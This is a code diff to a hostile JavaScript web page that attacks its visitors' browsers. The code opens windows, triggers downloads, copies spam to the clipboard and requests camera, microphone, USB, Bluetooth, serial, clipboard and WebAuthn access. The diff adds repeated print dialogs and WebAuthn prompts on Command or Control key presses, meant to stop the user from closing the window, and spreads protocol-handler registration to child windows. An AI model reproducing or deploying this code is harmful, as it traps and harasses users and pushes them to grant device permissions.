@@ -192,7 +192,6 @@ else initParentWindow()
  */
 function init () {
   confirmPageUnload()
-  registerProtocolHandlers()
 
   interceptUserInput(event => {
     interactionCount += 1
@@ -201,7 +200,11 @@ function init () {
     event.preventDefault()
     event.stopPropagation()
 
-    requestPointerLock()
+    // 'touchstart' and 'touchend' events are not able to open a new window
+    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
+    // a clever way to exclude touch events.
+    if (event.which !== 0) openWindow()
+
     startVibrateInterval()
     enablePictureInPicture()
     triggerFileDownload()
@@ -209,30 +212,33 @@ function init () {
     focusWindows()
     copySpamToClipboard()
     speak()
-    requestClipboardRead()
-    if (!window.ApplePaySession) {
-      // Don't request TouchID on every interaction in Safari since it blocks
-      // the event loop and stops windows from moving
-      requestWebauthnAttestation()
-    }
-    requestMidiAccess()
-    requestBluetoothAccess()
-    requestUsbAccess()
-    requestSerialAccess()
-    requestHidAccess()
-    requestCameraAndMic()
-    requestFullscreen()
 
     // Capture key presses on the Command or Control keys, to interfere with the
     // "Close Window" shortcut.
     if (event.key === 'Meta' || event.key === 'Control') {
       window.print()
-    }
+      requestWebauthnAttestation()
+      window.print()
+      requestWebauthnAttestation()
+      window.print()
+      requestWebauthnAttestation()
+    } else {
+      requestPointerLock()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
-    if (event.which !== 0) openWindow()
+      if (!window.ApplePaySession) {
+        // Don't request TouchID on every interaction in Safari since it blocks
+        // the event loop and stops windows from moving
+        requestWebauthnAttestation()
+      }
+      requestClipboardRead()
+      requestMidiAccess()
+      requestBluetoothAccess()
+      requestUsbAccess()
+      requestSerialAccess()
+      requestHidAccess()
+      requestCameraAndMic()
+      requestFullscreen()
+    }
   })
 }
 
@@ -240,6 +246,7 @@ function init () {
  * Initialization code for child windows.
  */
 function initChildWindow () {
+  registerProtocolHandlers()
   hideCursor()
   moveWindowBounce()
   startVideo()
@@ -268,6 +275,7 @@ function initParentWindow () {
   interceptUserInput(event => {
     // Only run these on the first interaction
     if (interactionCount === 1) {
+      registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
       hideCursor()
       startVideo()
